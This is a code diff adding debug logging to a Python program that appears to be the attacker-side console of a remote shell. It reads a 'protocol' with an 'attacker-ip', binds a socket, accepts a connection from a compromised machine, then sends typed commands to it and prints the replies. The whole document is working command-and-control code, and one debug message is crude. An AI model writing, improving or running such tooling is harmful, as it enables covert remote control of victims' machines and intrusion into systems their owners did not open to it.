@@ -44,6 +44,18 @@ def handle_error(context, error_message):
 
 
 
+def debug_write(*args, **kwargs):
+	___DEBUG_MODE_ENABLED___new___ = None
+	if "DEBUG_MODE_ENABLED" in globals():
+		___DEBUG_MODE_ENABLED___new___ = globals().get("DEBUG_MODE_ENABLED")
+	else:
+		___DEBUG_MODE_ENABLED___new___ = False
+
+	if ___DEBUG_MODE_ENABLED___new___:
+		print(*args, **kwargs)
+
+
+
 # [end-insert: before-main] #
 
 
@@ -63,17 +75,15 @@ def __main():
 	if not "___INSERTED_PROTOCOL___" in globals(): handle_error(None, "No protocol inserted.")
 	___INSERTED_PROTOCOL___new___ = globals().get("___INSERTED_PROTOCOL___")
 
-
-
 	context = {}
 
+	debug_write("Fetching protocol...")
 	context["protocol"] = json.loads(___INSERTED_PROTOCOL___new___)
+	debug_write("Creating socket...")
 	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-
-
+	debug_write("Parsing protocol...")
 	protocol, buffer_size, attacker_ip, acceptable_ports, sock, suffix, normal_sub_proto = None, None, None, None, None, None, None
-
 	try:
 		protocol = context.get("protocol")
 		buffer_size = protocol.get("buffer-size")
@@ -82,14 +92,12 @@ def __main():
 		sock = context.get("socket")
 		suffix = protocol.get("message-suffix")
 		normal_sub_proto = protocol.get("normal-sub-protocol")
-	except: pass
+	except Exception as e:
+		debug_write("Exception occurred while parsing protocol:", e)
 
-
-
+	debug_write("Validating protocol...")
 	if not protocol: handle_error(context, "Protocol file was found but `json.loads` failed.")
-
 	if not buffer_size: handle_error(context, "Invalid protocol: `buffer-size` is not defined.")
-
 	if protocol.get("fallback-ip"): handle_error(context, "Invalid protocol: `fallback-ip` has not been implemented yet.")
 
 	if not attacker_ip: handle_error(context, "Invalid protocol: `attacker-ip` is not defined.")
@@ -103,19 +111,16 @@ def __main():
 	if not normal_sub_proto.get("function-configurations"):
 		handle_error(context, "Invalid protocol: `function-configurations` is not defined within `normal-sub-protocol`.")
 
-
-
+	debug_write("Binding socket...")
 	sock.bind(("0.0.0.0", acceptable_ports[0]))
 	sock.listen(1)
 
 	context["connection"], context["address"] = sock.accept()
-
-
-
 	connection, address = context.get("connection"), context.get("address")
+	debug_write("Connection accepted.")
 
 
-
+	debug_write("Commencing handshake...")
 	if protocol.get("handshake-sub-protocol"):
 		hs_sub_proto = protocol.get("handshake-sub-protocol")
 
@@ -132,15 +137,20 @@ def __main():
 			handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `client`.")
 		
 		for message in hs_client_proto.get("unconditional-sequence"):
+			debug_write("Sending message:", message)
 			connection.send(message.encode())
+			debug_write("Receiving data...")
 			data = connection.recv(buffer_size)
 			break # for now
 
 
 
 	while True:
+		debug_write("enter a command dickhead...")
 		command = input("# ")
+		debug_write("Sending command:", command)
 		connection.send(f"{command}{suffix}".encode())
+		debug_write("Receiving data...")
 		context["data"] = receive_data(context)
 		data = context.get("data")
 		print(data)
